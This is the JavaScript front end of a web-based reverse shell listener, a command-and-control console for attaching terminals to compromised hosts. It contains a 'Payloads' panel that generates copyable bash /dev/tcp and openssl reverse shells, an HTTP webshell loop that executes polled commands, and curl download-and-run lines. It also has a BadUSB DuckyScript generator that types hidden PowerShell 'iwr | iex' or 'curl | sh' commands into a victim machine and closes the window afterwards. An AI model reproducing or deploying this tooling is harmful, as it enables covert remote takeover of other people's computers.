import { state, el, list, when, mount } from "@nemanjan00/qrp";
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

import "@xterm/xterm/css/xterm.css";
import "./theme.css";

// --- Dracula theme for xterm ------------------------------------------------
const draculaTheme = {
  background: "#282a36",
  foreground: "#f8f8f2",
  cursor: "#f8f8f2",
  cursorAccent: "#282a36",
  selectionBackground: "#44475a",
  black: "#21222c",
  red: "#ff5555",
  green: "#50fa7b",
  yellow: "#f1fa8c",
  blue: "#bd93f9",
  magenta: "#ff79c6",
  cyan: "#8be9fd",
  white: "#f8f8f2",
  brightBlack: "#6272a4",
  brightRed: "#ff6e6e",
  brightGreen: "#69ff94",
  brightYellow: "#ffffa5",
  brightBlue: "#d6acff",
  brightMagenta: "#ff92df",
  brightCyan: "#a4ffff",
  brightWhite: "#ffffff",
};

// --- Reactive app state -----------------------------------------------------
const app = state({
  sessions: [], // array of session metas
  hosts: [],    // array of host metas (mux clients)
  currentId: null,
  connected: false, // terminal websocket connected
  sidebarOpen: false, // mobile hamburger state
  buildTargets: [],
  buildTarget: "linux-amd64",
  buildServer: "",
  buildTags: "",
  building: false,
  hostDetailsId: null, // which host is shown in the details overlay
  search: "", // sidebar filter text
  paletteOpen: false, // Ctrl+K command palette
  paletteQuery: "",
  paletteIndex: 0, // selected row in the palette
  modal: null, // "build" | "badusb" | null — which modal is open
  buildToken: "", // BUILD_TOKEN fetched from /api/build/token for the BadUSB /s URL
  badUsbOs: "linux",
  badUsbArch: "amd64",
  badUsbTags: "",
  badUsbLoader: true,
  badUsbCopied: false,
  logEntries: [],
  logWs: null,
  payloadsOpen: false,
  csrfTokenValue: "",
});

const current = () => app.sessions.find((s) => s.id === app.currentId) || null;

function csrfToken() {
  if (app.csrfTokenValue) return app.csrfTokenValue;
  // Fallback to the legacy non-HttpOnly cookie for sessions issued before the
  // /api/csrf endpoint was introduced.
  const m = document.cookie.match(/(?:^|; )rsl_csrf=([^;]+)/);
  return m ? decodeURIComponent(m[1]) : "";
}

async function loadCsrfToken() {
  try {
    const res = await fetch("/api/csrf");
    if (res.ok) {
      const data = await res.json();
      app.csrfTokenValue = data.csrf || "";
    }
  } catch {
    /* ignore */
  }
}

const hostMatches = (h) => {
  const q = app.search.trim().toLowerCase();
  if (!q) return true;
  return [h.label, h.hostname, h.username, h.os, h.arch, h.tags, h.remote, h.id]
    .filter(Boolean)
    .some((v) => String(v).toLowerCase().includes(q));
};
const sessionMatches = (s) => {
  const q = app.search.trim().toLowerCase();
  if (!q) return true;
  return [s.remote, s.transport, s.id].filter(Boolean).some((v) =>
    String(v).toLowerCase().includes(q)
  );
};
const liveSessions = () => app.sessions.filter((s) => s.alive && sessionMatches(s));
const deadSessions = () => app.sessions.filter((s) => !s.alive && sessionMatches(s));
const liveHosts = () => app.hosts.filter((h) => h.alive && hostMatches(h));

// --- Command palette (Ctrl+K) ---------------------------------------------
// One ranked list of every host + session, filtered by the palette query.
// Hosts come first (they're the "containers"), then live sessions, then dead.
function paletteItems() {
  const q = app.paletteQuery.trim().toLowerCase();
  const match = (fields) =>
    !q || fields.filter(Boolean).some((v) => String(v).toLowerCase().includes(q));
  const items = [];
  for (const h of app.hosts) {
    if (!match([h.label, h.hostname, h.username, h.os, h.arch, h.tags, h.remote, h.id])) continue;
    items.push({
      kind: "host",
      id: h.id,
      title: h.label || h.hostname || h.remote,
      sub: `host · ${h.username || "?"}@${h.os}/${h.arch} · ${h.channels}ch`,
      action: () => openHostDetails(h.id),
    });
  }
  for (const s of app.sessions) {
    if (!match([s.remote, s.transport, s.id])) continue;
    items.push({
      kind: "session",
      id: s.id,
      title: s.remote,
      sub: `${s.transport} · ${s.id}${s.alive ? "" : " · dead"}`,
      action: () => selectSession(s.id),
      dead: !s.alive,
    });
  }
  return items;
}

function openPalette() {
  app.paletteOpen = true;
  app.paletteQuery = "";
  app.paletteIndex = 0;
}

function closePalette() {
  app.paletteOpen = false;
}

function openModal(name) {
  app.modal = name;
}

function closeModal() {
  app.modal = null;
}

function openPayloads() {
  app.payloadsOpen = true;
}
function closePayloads() {
  app.payloadsOpen = false;
}

function paletteRunSelected() {
  const items = paletteItems();
  const it = items[app.paletteIndex];
  if (it) {
    it.action();
    closePalette();
  }
}

function paletteMove(delta) {
  const items = paletteItems();
  if (!items.length) return;
  app.paletteIndex = (app.paletteIndex + delta + items.length) % items.length;
}

window.addEventListener("keydown", (e) => {
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
    e.preventDefault();
    if (app.paletteOpen) closePalette();
    else openPalette();
    return;
  }
  if (!app.paletteOpen) return;
  if (e.key === "Escape") {
    e.preventDefault();
    closePalette();
  } else if (e.key === "ArrowDown") {
    e.preventDefault();
    paletteMove(1);
  } else if (e.key === "ArrowUp") {
    e.preventDefault();
    paletteMove(-1);
  } else if (e.key === "Enter") {
    e.preventDefault();
    paletteRunSelected();
  }
});

const wsUrl = (path) =>
  (location.protocol === "https:" ? "wss://" : "ws://") + location.host + path;

// --- Terminal controller (kept outside qrp's reactive DOM) ------------------
const termCtl = (() => {
  let term = null;
  let fit = null;
  let ws = null;

  const doFit = () => {
    if (fit) {
      try {
        fit.fit();
      } catch {
        /* container not measurable yet */
      }
    }
  };

  const sendResize = () => {
    if (ws && ws.readyState === WebSocket.OPEN && term) {
      ws.send(JSON.stringify({ type: "resize", cols: term.cols, rows: term.rows }));
    }
  };

  const detach = () => {
    window.removeEventListener("resize", doFit);
    if (ws) {
      ws.onclose = null;
      try {
        ws.close();
      } catch {
        /* ignore */
      }
      ws = null;
    }
    if (term) {
      term.dispose();
      term = null;
    }
    fit = null;
    app.connected = false;
  };

  const attach = (id) => {
    detach();
    const termHost = document.getElementById("term-host");
    if (!termHost) return;
    termHost.innerHTML = "";

    term = new Terminal({
      theme: draculaTheme,
      fontFamily: '"Hack Nerd Font Mono", "JetBrains Mono", ui-monospace, Menlo, monospace',
      fontSize: 13,
      cursorBlink: true,
      convertEol: false,
      scrollback: 5000,
      allowProposedApi: true,
      mouseEvents: true,
      screenReaderMode: false,
    });
    fit = new FitAddon();
    term.loadAddon(fit);
    term.open(termHost);
    doFit();
    term.focus();

    ws = new WebSocket(wsUrl("/api/ws/session/" + id));
    ws.binaryType = "arraybuffer";

    ws.onopen = () => {
      app.connected = true;
      sendResize();
    };
    ws.onclose = () => {
      app.connected = false;
    };
    ws.onmessage = (ev) => {
      if (typeof ev.data === "string") {
        try {
          const msg = JSON.parse(ev.data);
          if (msg.type === "exit") app.connected = false;
        } catch {
          /* ignore */
        }
        return;
      }
      term.write(new Uint8Array(ev.data));
    };

    const enc = new TextEncoder();
    term.onData((d) => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(enc.encode(d));
      }
    });
    // Mouse events are handled by xterm internally when mouseEvents:true and
    // translated into the appropriate OSC/CSI sequences in the onData stream.
    // We also make sure the terminal container captures pointer events.
    if (termHost) {
      termHost.style.pointerEvents = "auto";
      termHost.style.touchAction = "none";
    }
    term.onResize(() => sendResize());

    window.addEventListener("resize", doFit);
  };

  return { attach, detach, sendResize };
})();

// --- Actions ---------------------------------------------------------------
function selectSession(id) {
  app.currentId = id;
  app.sidebarOpen = false;
  termCtl.attach(id);
}

async function apiPost(url, body) {
  const token = csrfToken();
  if (!token) {
    alert("Session expired or CSRF cookie missing. Please log in again.");
    location.href = "/login";
    return;
  }
  const options = {
    method: "POST",
    headers: { "X-CSRF-Token": token },
  };
  if (body !== undefined) {
    options.headers["Content-Type"] = "application/json";
    options.body = JSON.stringify(body);
  }
  try {
    const res = await fetch(url, options);
    if (!res.ok) {
      const err = await res.json().catch(() => ({}));
      console.error("API error:", res.status, err);
    }
    return res;
  } catch (e) {
    console.error("Network error:", e);
  }
}

async function killCurrent() {
  const c = current();
  if (!c) return;
  await apiPost(`/api/sessions/${c.id}/kill`);
}

async function clearDeadSessions() {
  await apiPost("/api/sessions/clear-dead");
}

function upgradeCurrent() {
  const c = current();
  if (!c) return;
  // Sent over the terminal websocket's control channel.
  const ws = new WebSocket(wsUrl("/api/ws/session/" + c.id));
  ws.binaryType = "arraybuffer";
  ws.onopen = () => {
    ws.send(JSON.stringify({ type: "upgrade" }));
    setTimeout(() => ws.close(), 200);
  };
}

async function openHostShell(hostId) {
  const host = app.hosts.find((h) => h.id === hostId);
  if (!host || !host.alive) return;
  const cols = termCtl.term?.cols || 80;
  const rows = termCtl.term?.rows || 24;
  await apiPost(`/api/hosts/${hostId}/shells`, { cols, rows });
}

function openHostDetails(hostId) {
  app.hostDetailsId = hostId;
}

function closeHostDetails() {
  app.hostDetailsId = null;
}

function currentHost() {
  return app.hosts.find((h) => h.id === app.hostDetailsId) || null;
}

async function loadBuildTargets() {
  try {
    const res = await fetch("/api/build/targets");
    if (res.ok) {
      app.buildTargets = await res.json();
      if (!app.buildTargets.includes(app.buildTarget)) {
        app.buildTarget = app.buildTargets[0] || "";
      }
    }
    const tok = await fetch("/api/build/token");
    if (tok.ok) {
      const t = await tok.json();
      app.buildToken = t.token || "";
    }
  } catch {
    /* ignore */
  }
  if (!app.buildServer) {
    const proto = location.protocol === "https:" ? "wss://" : "ws://";
    app.buildServer = `${proto}${location.host}/mux`;
  }
}

function buildClientUrl() {
  const t = app.buildTarget || "linux-amd64";
  const s = app.buildServer || "";
  const tg = app.buildTags || "";
  const q = { target: t, server: s };
  if (tg) q.tags = tg;
  return `/api/build/client?${new URLSearchParams(q)}`;
}

async function downloadClient() {
  if (app.building) return;
  app.building = true;
  try {
    const res = await fetch(buildClientUrl());
    if (!res.ok) {
      const err = await res.json().catch(() => ({}));
      alert("Build failed: " + (err.detail || res.statusText));
      return;
    }
    const blob = await res.blob();
    const cd = res.headers.get("Content-Disposition") || "";
    const m = cd.match(/filename="?([^"]+)"?/i);
    const name = m ? m[1] : "rsl-client";
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = name;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  } catch (err) {
    alert("Build failed: " + err.message);
  } finally {
    app.building = false;
  }
}

// --- BadUSB / DuckyScript generator ----------------------------------------
function badUsbDownloadUrl() {
  const os = app.badUsbOs || "linux";
  const arch = app.badUsbArch || "amd64";
  const tags = app.badUsbTags || "";
  const proto = location.protocol === "https:" ? "https://" : "http://";
  const host = location.host;
  const q = { os, arch };
  if (tags) q.tags = tags;
  if (app.buildToken) q.token = app.buildToken;
  return `${proto}${host}/dl?${new URLSearchParams(q)}`;
}

// Short bootstrap URL — the DuckyScript types `curl <this> | sh`, the
// script fetched from here downloads + runs the full binary. Keeps the
// typed payload minimal.
function badUsbShortUrl() {
  const os = app.badUsbOs || "linux";
  const arch = app.badUsbArch || "amd64";
  const tags = app.badUsbTags || "";
  const proto = location.protocol === "https:" ? "https://" : "http://";
  const host = location.host;
  const q = { os, arch };
  if (tags) q.tags = tags;
  if (app.buildToken) q.token = app.buildToken;
  return `${proto}${host}/dl/s?${new URLSearchParams(q)}`;
}

function badUsbScript() {
  const useLoader = app.badUsbLoader;
  const url = useLoader ? badUsbShortUrl() : badUsbDownloadUrl();
  const os = app.badUsbOs || "linux";
  const lines = [];
  if (os === "windows" || os === "win") {
    lines.push("GUI r");
    lines.push("DELAY 500");
    if (useLoader) {
      lines.push("STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -c \"iwr '" + url + "' | iex\"");
    } else {
      lines.push(`STRING $r="${url}"; $o="$env:TEMP\\rsl.exe"; (New-Object Net.WebClient).DownloadFile($r,$o); Start-Process $o`);
    }
    lines.push("ENTER");
  } else {
    lines.push("CTRL ALT t");
    lines.push("DELAY 800");
    if (useLoader) {
      lines.push("STRING curl -sL '" + url + "' | sh &");
    } else {
      lines.push("STRING curl -sL '" + url + "' -o /tmp/.rsl && chmod +x /tmp/.rsl && /tmp/.rsl &");
    }
    lines.push("ENTER");
    lines.push("DELAY 200");
    lines.push("CTRL w");
  }
  return lines.join("\n");
}

async function copyBadUsbScript() {
  const script = badUsbScript();
  try {
    await navigator.clipboard.writeText(script);
    app.badUsbCopied = true;
    setTimeout(() => (app.badUsbCopied = false), 1500);
  } catch {
    downloadBadUsbScript();
  }
}

function downloadBadUsbScript() {
  const script = badUsbScript();
  const blob = new Blob([script], { type: "text/plain" });
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "payload.txt";
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(a.href);
}

// --- Session list stream ---------------------------------------------------
function connectSessionsStream() {
  const ws = new WebSocket(wsUrl("/api/ws/sessions"));

  ws.onmessage = (ev) => {
    let m;
    try {
      m = JSON.parse(ev.data);
    } catch {
      return;
    }
    if (m.type === "snapshot") {
      app.sessions = m.sessions;
      app.hosts = m.hosts || [];
    } else if (m.type === "add") {
      app.sessions = [...app.sessions.filter((s) => s.id !== m.session.id), m.session];
    } else if (m.type === "update") {
      app.sessions = app.sessions.map((s) => (s.id === m.session.id ? m.session : s));
    } else if (m.type === "remove") {
      app.sessions = app.sessions.filter((s) => s.id !== m.session.id);
      if (app.currentId === m.session.id) {
        app.currentId = null;
        termCtl.detach();
      }
    } else if (m.type === "host_add") {
      app.hosts = [...app.hosts.filter((h) => h.id !== m.host.id), m.host];
    } else if (m.type === "host_update") {
      app.hosts = app.hosts.map((h) => (h.id === m.host.id ? m.host : h));
    } else if (m.type === "host_remove") {
      app.hosts = app.hosts.filter((h) => h.id !== m.host.id);
    }
    // Auto-select the first live session if nothing is selected.
    if (!app.currentId) {
      const first = liveSessions()[0];
      if (first) selectSession(first.id);
    }
  };

  ws.onclose = () => setTimeout(connectSessionsStream, 1500);
  ws.onerror = () => {
    try {
      ws.close();
    } catch {
      /* ignore */
    }
  };
}

// --- Event log stream ------------------------------------------------------
const LOG_MAX = 500;

function formatTime(ts) {
  const d = new Date(ts);
  return d.toLocaleTimeString(undefined, { hour12: false });
}

function connectLogStream() {
  const since = app.logEntries.length
    ? Math.max(...app.logEntries.map((e) => e.ts))
    : 0;
  const url = wsUrl("/api/ws/log") + (since ? `?since=${since}` : "");
  const ws = new WebSocket(url);
  app.logWs = ws;

  ws.onmessage = (ev) => {
    let entry;
    try {
      entry = JSON.parse(ev.data);
    } catch {
      return;
    }
    app.logEntries = [...app.logEntries, entry].slice(-LOG_MAX);
  };

  ws.onclose = () => {
    app.logWs = null;
    setTimeout(connectLogStream, 1500);
  };
  ws.onerror = () => {
    try {
      ws.close();
    } catch {
      /* ignore */
    }
  };
}

// --- Views -----------------------------------------------------------------
const Brand = () =>
  el(
    "div",
    { class: "brand" },
    el("div", { class: "logo" }, "»_"),
    el(
      "div",
      {},
      el("h1", {}, "REVERSE SHELL"),
      el("div", { class: "sub" }, "listener")
    )
  );

const sessionRow = (s) =>
  el(
    "div",
    {
      class: () =>
        "session " +
        (s.alive ? "" : "dead ") +
        (app.currentId === s.id ? "active" : ""),
      onclick: () => selectSession(s.id),
    },
    el("span", { class: "dot" }),
    el(
      "div",
      { class: "meta" },
      el("div", { class: "remote" }, s.remote),
      el("div", { class: "sub" }, `#${s.id}`)
    ),
    el("span", { class: "badge " + s.transport }, s.transport)
  );

const hostRow = (h) =>
  el(
    "div",
    {
      class: "session host",
      onclick: () => openHostDetails(h.id),
    },
    el("span", { class: "dot" }),
    el(
      "div",
      { class: "meta" },
      el("div", { class: "remote" }, h.label || h.hostname || h.remote),
      el(
        "div",
        { class: "sub" },
        `${h.username || "?"}@${h.os}/${h.arch} #${h.id}`
      )
    ),
    el(
      "button",
      {
        class: "btn micro",
        onclick: (e) => {
          e.stopPropagation();
          openHostShell(h.id);
        },
        title: "Open a new PTY shell on this host",
      },
      "+ shell"
    )
  );

const ModalShell = ({ title, onClose, children }) =>
  el(
    "div",
    {
      class: "modal-overlay",
      onclick: (e) => {
        if (e.target.classList.contains("modal-overlay")) onClose();
      },
    },
    el(
      "div",
      { class: "modal" },
      el(
        "div",
        { class: "modal-header" },
        el("div", { class: "modal-title" }, title),
        el(
          "button",
          {
            class: "btn micro",
            onclick: onClose,
            title: "Close",
          },
          "×"
        )
      ),
      el("div", { class: "modal-body" }, ...children)
    )
  );

const BuildModal = () =>
  when(
    () => app.modal === "build",
    () =>
      ModalShell({
        title: "Build client",
        onClose: closeModal,
        children: [
          el(
            "label",
            { class: "field" },
            el("span", {}, "Server URL"),
            el("input", {
              type: "text",
              placeholder: "ws://1.2.3.4:8080/mux",
              value: () => app.buildServer,
              oninput: (e) => (app.buildServer = e.target.value),
            })
          ),
          el(
            "label",
            { class: "field" },
            el("span", {}, "Tags"),
            el("input", {
              type: "text",
              placeholder: "victim-1",
              value: () => app.buildTags,
              oninput: (e) => (app.buildTags = e.target.value),
            })
          ),
          el(
            "label",
            { class: "field" },
            el("span", {}, "Target"),
            el(
              "select",
              {
                onchange: (e) => (app.buildTarget = e.target.value),
              },
              list(
                () => app.buildTargets,
                (t) => t,
                (t) =>
                  el(
                    "option",
                    { value: t, selected: () => app.buildTarget === t },
                    t
                  )
              )
            )
          ),
          el(
            "button",
            {
              class: "btn",
              disabled: () => app.building,
              onclick: downloadClient,
            },
            () => (app.building ? "Building…" : "Download")
          ),
        ],
      })
  );

const BadUsbModal = () =>
  when(
    () => app.modal === "badusb",
    () =>
      ModalShell({
        title: "BadUSB / DuckyScript",
        onClose: closeModal,
        children: [
          el(
            "label",
            { class: "field" },
            el("span", {}, "OS"),
            el(
              "select",
              {
                onchange: (e) => (app.badUsbOs = e.target.value),
              },
              el("option", { value: "linux", selected: () => app.badUsbOs === "linux" }, "linux"),
              el("option", { value: "windows", selected: () => app.badUsbOs === "windows" }, "windows"),
              el("option", { value: "darwin", selected: () => app.badUsbOs === "darwin" }, "darwin")
            )
          ),
          el(
            "label",
            { class: "field" },
            el("span", {}, "Arch"),
            el(
              "select",
              {
                onchange: (e) => (app.badUsbArch = e.target.value),
              },
              ["amd64", "arm64", "arm-7", "386", "mipsle-softfloat"].map((a) =>
                el("option", { value: a, selected: () => app.badUsbArch === a }, a)
              )
            )
          ),
          el(
            "label",
            { class: "field" },
            el("span", {}, "Tags"),
            el("input", {
              type: "text",
              placeholder: "victim-1",
              value: () => app.badUsbTags,
              oninput: (e) => (app.badUsbTags = e.target.value),
            })
          ),
          el(
            "label",
            { class: "field checkbox" },
            el("input", {
              type: "checkbox",
              checked: () => app.badUsbLoader,
              onchange: (e) => (app.badUsbLoader = e.target.checked),
            }),
            el("span", {}, "Use bootstrap loader (shorter payload, downloads binary at runtime)")
          ),
          el(
            "div",
            { class: "ducky-preview" },
            el("div", { class: "list-group-label" }, el("span", {}, "Script")),
            el("pre", { class: "ducky-script" }, () => badUsbScript())
          ),
          el(
            "div",
            { class: "modal-actions" },
            el(
              "button",
              { class: "btn", onclick: copyBadUsbScript },
              () => (app.badUsbCopied ? "Copied!" : "Copy")
            ),
            el(
              "button",
              { class: "btn", onclick: downloadBadUsbScript },
              "Download .txt"
            )
          ),
        ],
      })
  );

const PayloadsModal = () =>
  when(
    () => app.payloadsOpen,
    () => {
      const host = location.host;
      const hostname = location.hostname;
      const httpProto = location.protocol === "https:" ? "https" : "http";
      const wsProto = location.protocol === "https:" ? "wss" : "ws";
      const token = app.buildToken || "YOUR_BUILD_TOKEN";
      const tcpPayload = `bash -i >& /dev/tcp/${hostname}/1337 0>&1`;
      const tlsPayload = `mkfifo /tmp/f; /bin/sh -i </tmp/f 2>&1 | openssl s_client -quiet -connect ${hostname}:1338 >/tmp/f`;
      const webPayload = `H=${httpProto}://${host}; T=${token}\nID=$(curl -s "$H/webshell/register?token=$T")\nwhile :; do\n  C=$(curl -s -H "X-RSL-Token: $T" "$H/webshell/$ID/poll")\n  [ -n "$C" ] && O=$(printf '%s' "$C" | sh 2>&1)\n  curl -s -H "X-RSL-Token: $T" --data-binary "$O" "$H/webshell/$ID/output"\ndone`;
      const muxPayload = `RSL_SERVER=${wsProto}://${host}/mux RSL_TOKEN=${token} ./rsl-client`;
      const muxDownloadPayload = `curl -sL '${httpProto}://${host}/dl?token=${token}&os=linux&arch=amd64' -o /tmp/rsl
chmod +x /tmp/rsl
/tmp/rsl &`;
      const copy = (text) =>
        navigator.clipboard.writeText(text).catch(() => {});
      const block = (title, text) =>
        el(
          "div",
          { class: "payload-block" },
          el("div", { class: "list-group-label" }, el("span", {}, title)),
          el("pre", { class: "payload-script" }, text),
          el(
            "button",
            { class: "btn micro", onclick: () => copy(text) },
            "Copy"
          )
        );
      return ModalShell({
        title: "Payloads",
        onClose: closePayloads,
        children: [
          block("Raw TCP", tcpPayload),
          block("TLS", tlsPayload),
          block("HTTP webshell", webPayload),
          block("Mux / Go client", muxPayload),
          block("Mux / download & run", muxDownloadPayload),
        ],
      });
    }
  );

const HostDetails = () =>
  when(
    () => app.hostDetailsId !== null,
    () => {
      const h = currentHost();
      if (!h) {
        app.hostDetailsId = null;
        return el("div");
      }
      const channelSessions = (h.channelList || []).map((c) => {
        const s = app.sessions.find((s) => s.id === c.sessionId);
        return { ...c, session: s };
      });
      return el(
        "div",
        {
          class: "host-details-overlay",
          onclick: (e) => {
            if (e.target.classList.contains("host-details-overlay")) closeHostDetails();
          },
        },
        el(
          "div",
          { class: "host-details" },
          el(
            "div",
            { class: "host-details-header" },
            el(
              "div",
              { class: "host-details-title" },
              el("div", { class: "remote" }, h.label || h.hostname || h.remote),
              el(
                "div",
                { class: "sub" },
                `${h.username || "?"}@${h.hostname || "?"} · ${h.os}/${h.arch} · ${h.id}`
              )
            ),
            el(
              "button",
              {
                class: "btn micro",
                onclick: closeHostDetails,
                title: "Close",
              },
              "×"
            )
          ),
          el(
            "div",
            { class: "host-details-meta" },
            kv("Remote", h.remote),
            kv("Tags", h.tags || "—"),
            kv("Status", h.alive ? "alive" : "dead"),
            kv("Channels", `${h.channels || 0}`),
            kv("Created", new Date(h.createdAt).toLocaleString())
          ),
          el(
            "div",
            { class: "list-group-label" },
            el("span", {}, "Channels"),
            el("span", {}, () => `${channelSessions.length}`)
          ),
          when(
            () => channelSessions.length === 0,
            () => el("div", { class: "empty" }, "No open channels")
          ),
          ...channelSessions.map((c) =>
            el(
              "div",
              {
                class: "channel-row " + (c.alive ? "" : "dead"),
                onclick: () => {
                  if (c.alive && c.sessionId) {
                    selectSession(c.sessionId);
                    closeHostDetails();
                  }
                },
              },
              el("span", { class: "dot" }),
              el(
                "div",
                { class: "meta" },
                el("div", { class: "remote" }, `ch#${c.channelId} → ${c.sessionId}`),
                el(
                  "div",
                  { class: "sub" },
                  c.alive ? "alive" : "exited"
                )
              ),
              el(
                "span",
                { class: "badge " + (c.alive ? "mux" : "dead") },
                c.alive ? "mux" : "dead"
              )
            )
          ),
          el(
            "div",
            { class: "host-details-actions" },
            el(
              "button",
              {
                class: "btn",
                disabled: () => !h.alive,
                onclick: () => {
                  openHostShell(h.id);
                  closeHostDetails();
                },
              },
              "+ new shell"
            )
          )
        )
      );
    }
  );

const kv = (k, v) =>
  el(
    "div",
    { class: "kv" },
    el("span", { class: "k" }, k),
    el("span", { class: "v" }, String(v))
  );

const CommandPalette = () =>
  when(
    () => app.paletteOpen,
    () => {
      const items = paletteItems();
      return el(
        "div",
        {
          class: "palette-overlay",
          onclick: (e) => {
            if (e.target.classList.contains("palette-overlay")) closePalette();
          },
        },
        el(
          "div",
          { class: "palette" },
          el(
            "div",
            { class: "palette-input-wrap" },
            el("input", {
              type: "text",
              class: "palette-input",
              placeholder: "Jump to host or session…",
              value: () => app.paletteQuery,
              oninput: (e) => {
                app.paletteQuery = e.target.value;
                app.paletteIndex = 0;
              },
              onkeydown: (e) => {
                if (e.key === "ArrowDown") {
                  e.preventDefault();
                  paletteMove(1);
                } else if (e.key === "ArrowUp") {
                  e.preventDefault();
                  paletteMove(-1);
                } else if (e.key === "Enter") {
                  e.preventDefault();
                  paletteRunSelected();
                } else if (e.key === "Escape") {
                  e.preventDefault();
                  closePalette();
                }
              },
              autofocus: true,
            })
          ),
          el(
            "div",
            { class: "palette-list" },
            when(
              () => items.length === 0,
              () => el("div", { class: "palette-empty" }, "No matches")
            ),
            list(
              () => items,
              (it) => it.kind + ":" + it.id,
              (it, i) =>
                el(
                  "div",
                  {
                    class: () =>
                      "palette-row " +
                      it.kind +
                      (it.dead ? " dead" : "") +
                      (i === app.paletteIndex ? " active" : ""),
                    onclick: () => {
                      it.action();
                      closePalette();
                    },
                  },
                  el("span", { class: "palette-kind" }, it.kind === "host" ? "»_" : "$"),
                  el(
                    "div",
                    { class: "palette-meta" },
                    el("div", { class: "palette-title" }, it.title),
                    el("div", { class: "palette-sub" }, it.sub)
                  )
                )
            )
          ),
          el(
            "div",
            { class: "palette-footer" },
            el("span", {}, "↑↓ navigate"),
            el("span", {}, "↵ open"),
            el("span", {}, "esc close")
          )
        )
      );
    }
  );

const LogPanel = () =>
  el(
    "div",
    { class: "log-panel" },
    el(
      "div",
      { class: "list-group-label" },
      el("span", {}, "Event log"),
      el("span", {}, () => `${app.logEntries.length}`)
    ),
    el(
      "div",
      { class: "log-entries" },
      when(
        () => app.logEntries.length === 0,
        () => el("div", { class: "empty" }, "No events")
      ),
      list(
        () => app.logEntries.slice(-50).reverse(),
        (e) => `${e.ts}:${e.level}:${e.message}`,
        (e) =>
          el(
            "div",
            { class: "log-entry " + e.level, title: JSON.stringify(e) },
            el("span", { class: "log-ts" }, formatTime(e.ts)),
            el("span", { class: "log-level" }, e.level),
            el("span", { class: "log-msg" }, e.message)
          )
      )
    )
  );

const Sidebar = () =>
  el(
    "aside",
    {
      class: () => "sidebar " + (app.sidebarOpen ? "open" : ""),
    },
    Brand(),
    el(
      "div",
      { class: "search-wrap" },
      el("input", {
        type: "text",
        class: "search",
        placeholder: "Filter hosts / sessions…",
        value: () => app.search,
        oninput: (e) => (app.search = e.target.value),
      })
    ),
    el(
      "div",
      { class: "session-list" },
      el(
        "div",
        { class: "list-group-label" },
        el("span", {}, "Hosts"),
        el("span", {}, () => `${liveHosts().length}`)
      ),
      list(liveHosts, (h) => h.id, hostRow),
      when(
        () => liveHosts().length === 0,
        () => el("div", { class: "empty" }, "No mux hosts")
      ),
      el(
        "div",
        { class: "list-group-label" },
        el("span", {}, "Active"),
        el("span", {}, () => `${liveSessions().length}`)
      ),
      list(liveSessions, (s) => s.id, sessionRow),
      when(
        () => liveSessions().length === 0,
        () => el("div", { class: "empty" }, "No active sessions")
      ),
      el(
        "div",
        { class: "list-group-label" },
        el("span", {}, "Offline"),
        el("span", {}, () => `${deadSessions().length}`),
        when(
          () => deadSessions().length > 0,
          () =>
            el(
              "button",
              {
                class: "btn micro clear-dead",
                onclick: clearDeadSessions,
                title: "Remove all offline sessions",
              },
              "Clear"
            )
        )
      ),
      list(deadSessions, (s) => s.id, sessionRow),
      when(
        () => deadSessions().length === 0,
        () => el("div", { class: "empty" }, "None")
      )
    ),
    LogPanel(),
    el(
      "div",
      { class: "sidebar-actions" },
      el(
        "button",
        {
          class: "btn",
          onclick: () => openModal("build"),
        },
        "Build"
      ),
      el(
        "button",
        {
          class: "btn",
          onclick: () => openModal("badusb"),
        },
        "BadUSB"
      ),
      el(
        "button",
        {
          class: "btn",
          onclick: openPayloads,
        },
        "Payloads"
      )
    )
  );

const Hamburger = () =>
  el(
    "button",
    {
      class: "hamburger",
      onclick: () => (app.sidebarOpen = !app.sidebarOpen),
      "aria-label": "Toggle sessions",
      title: "Sessions",
    },
    el("span", {}),
    el("span", {}),
    el("span", {})
  );

const Toolbar = () =>
  el(
    "header",
    { class: "toolbar" },
    Hamburger(),
    el(
      "div",
      { class: "title" },
      () => (current() ? `${current().remote}` : "No session selected"),
      when(
        () => current(),
        () =>
          el(
            "span",
            { class: () => "badge " + (current() ? current().transport : "") },
            () => (current() ? current().transport : "")
          )
      ),
      when(
        () => current() && current().upgraded,
        () => el("span", { class: "badge tls" }, "PTY")
      )
    ),
    el("div", { class: "spacer" }),
    el(
      "div",
      {
        class: () =>
          "status " +
          (!current()
            ? ""
            : !current().alive
              ? "dead"
              : app.connected
                ? "connected"
                : ""),
      },
      el("span", { class: "dot" }),
      () =>
        !current()
          ? "idle"
          : !current().alive
            ? "dead"
            : app.connected
              ? "connected"
              : "connecting…"
    ),
    el(
      "button",
      {
        class: "btn",
        disabled: () =>
          !current() ||
          !current().alive ||
          current().transport === "webshell" ||
          current().transport === "mux" ||
          current().upgraded,
        onclick: upgradeCurrent,
        title: "Upgrade the remote shell to a PTY-backed bash",
      },
      "Upgrade PTY"
    ),
    el(
      "button",
      {
        class: "btn danger",
        disabled: () => !current() || !current().alive,
        onclick: killCurrent,
      },
      "Kill"
    )
  );

const Main = () =>
  el(
    "main",
    { class: "main" },
    Toolbar(),
    el(
      "div",
      { class: "content-area" },
      el(
        "div",
        { class: "term-wrap", style: () => (app.currentId ? "" : "display:none") },
        el("div", { id: "term-host", class: "term-host" })
      ),
      el(
        "div",
        { class: "placeholder", style: () => (app.currentId ? "display:none" : "") },
        el("div", {}, el("div", { class: "big" }, "Reverse Shell Listener"),
          el("div", {}, "Select a session to attach a terminal"))
      )
    )
  );

const SidebarBackdrop = () =>
  el(
    "div",
    {
      class: () => "sidebar-backdrop " + (app.sidebarOpen ? "open" : ""),
      onclick: () => (app.sidebarOpen = false),
    },
    ""
  );

// --- Boot ------------------------------------------------------------------
mount(document.getElementById("app"), () =>
  el("div", { class: "app" }, Sidebar(), SidebarBackdrop(), Main(), HostDetails(), CommandPalette(), BuildModal(), BadUsbModal(), PayloadsModal())
);

connectSessionsStream();
connectLogStream();
loadBuildTargets();
loadCsrfToken();
